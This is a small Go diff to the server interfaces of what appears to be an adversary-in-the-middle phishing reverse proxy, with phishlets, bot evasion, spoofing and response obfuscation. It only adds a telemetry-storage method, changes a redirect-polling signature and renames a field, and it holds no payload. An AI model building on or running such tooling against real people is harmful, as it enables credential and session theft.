@@ -61,6 +61,7 @@ type puppetOverrideSource interface {
 
 type telemetryScorer interface {
 	ScoreSession(sessionID string) float64
+	StoreTelemetry(t *aitm.BotTelemetry) error
 }
 
 type bodyObfuscator interface {
@@ -69,7 +70,7 @@ type bodyObfuscator interface {
 
 type redirectNotifier interface {
 	WaitForRedirect(w http.ResponseWriter, r *http.Request, sessionID string)
-	PollForRedirect(w http.ResponseWriter, r *http.Request)
+	PollForRedirect(w http.ResponseWriter, sessionID string)
 }
 
 // Server is a reverse-proxy HTTPS server.
@@ -131,14 +132,14 @@ type Server struct {
 	TrustedCIDRs []*net.IPNet
 
 	// Services
-	BotGuard       botEvaluator
-	Blacklist      ipBlocker
-	Spoofer        spoofer
-	PhishletSvc    phishletResolver
-	SessionSvc     sessionManager
-	PuppetSvc      puppetOverrideSource
-	TelemetryScore telemetryScorer
-	Obfuscator     bodyObfuscator
+	BotGuard     botEvaluator
+	Blacklist    ipBlocker
+	Spoofer      spoofer
+	PhishletSvc  phishletResolver
+	SessionSvc   sessionManager
+	PuppetSvc    puppetOverrideSource
+	TelemetrySvc telemetryScorer
+	Obfuscator   bodyObfuscator
 }
 
 // ListenAndServe listens on s.Addr and blocks until ctx is cancelled.
